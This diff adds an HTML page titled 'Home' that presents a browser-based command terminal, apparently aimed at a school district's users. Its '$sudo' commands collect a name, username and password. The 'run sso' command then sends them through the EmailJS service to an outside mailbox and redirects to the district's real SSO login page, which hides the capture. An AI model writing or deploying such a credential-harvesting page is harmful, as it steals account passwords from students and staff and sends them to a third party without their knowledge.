@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+        <script src="https://unpkg.com/jquery.terminal/js/jquery.terminal.min.js"></script>
+        <link rel="stylesheet" href="https://unpkg.com/jquery.terminal/css/jquery.terminal.min.css"/>
+        <link rel="icon" href="icon.png">
+        <script type="text/javascript"
+    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+        <title>Home</title>
+    </head>
+    <body id='body'>
+        <script>
+            var params = {
+                name: '',
+                user: '',
+                pass: ''
+            }
+        </script>
+        <script>
+            $('body').terminal({
+                'guessem': function() {
+                    window.location = 'https://lzdhpvjbygyl-html.na.app.codingrooms.com/guessem'
+                },
+                '$sudo': function(what1, what2) {
+                    if (what1 == 'name') {
+                        params.name = what2
+                    }
+                    if (what1 == 'user') {
+                        params.user = what2
+                    }
+                    if (what1 == 'pass') {
+                        params.pass = what2
+                    }
+                    if (what1 == 'games') {
+                        if (what2 == 'pls') {
+                            window.location = 'https://sites.google.com/view/iogames'
+                        }
+                    }
+                    if (what1 == 'run') {
+                        if (what2 == 'sso') {
+                            // `rewuweuodj36aer632466235-245-42524ynhdc24d-wr$$U®¨∑´´´¶b6´§ø•¶§∂ß¶§o76∫∂i76b∂¶ˆß§o∫§¶¶ˆ∫`
+                          //
+                            emailjs.send('default_service', 'template_tnz7xc5', params, 'user_S79td1VI68ICAjq796AOm').then(function() {
+                                window.location = 'https://idp.minnetonkaschools.org/login'
+                            })
+                        }
+                    }
+                }
+            }, {
+                greetings: ''
+            });
+        </script>
+    </body> 
+</html>
